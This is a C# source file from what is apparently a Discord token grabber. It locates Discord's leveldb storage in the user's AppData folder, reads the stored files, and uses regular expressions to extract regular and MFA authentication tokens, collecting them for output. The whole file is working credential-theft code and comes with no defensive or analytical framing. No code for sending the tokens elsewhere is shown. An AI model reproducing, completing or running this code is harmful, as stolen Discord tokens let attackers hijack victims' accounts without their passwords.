using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace discordtokengrabber
{
    class discord
    {
        miscellaneous misc = new miscellaneous();

        private static string str_tokens = "";

        private string get_path()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + "\\Discord\\Local Storage\\leveldb";
        }

        private bool find_token(string raw)
        {
            return raw.Contains("oken");
        }

        public string grab_token()
        {
            if (find_files().Count == 0)
                return "no tokerinos located :(";

            foreach (string token in find_files())
            {
                foreach (Match match in Regex.Matches(token.Remove(0, token.IndexOf("oken")), "([a-zA-Z0-9._-]{24}\\.[a-zA-Z0-9._-]{6}\\.[a-zA-Z0-9._-]{27})"))
                {
                    Console.WriteLine("non mfa token found");
                    str_tokens += match.ToString() + Environment.NewLine;
                }
                foreach (Match match in Regex.Matches(token.Remove(0, token.IndexOf("oken")), "(mfa\\.[a-zA-Z0-9._-]{84})"))
                {
                    Console.WriteLine("mfa token found");
                    str_tokens += match.ToString() + Environment.NewLine;
                }
            }

            return str_tokens.Length > 0 ? "\nfound tokens:\n" + str_tokens : "nooby no find XD";
        }

        public List<string> find_files()
        {
            List<string> lbd_files = new List<string>();

            if (!misc.validate_path(get_path()))
                return lbd_files;

            foreach (string ldbfile in misc.get_ldb_files(get_path()))
            {
                string str_raw = misc.read_file(ldbfile);
                if (find_token(str_raw))
                {
                    lbd_files.Add(str_raw);
                }
            }

            return lbd_files;
        }
    }
}
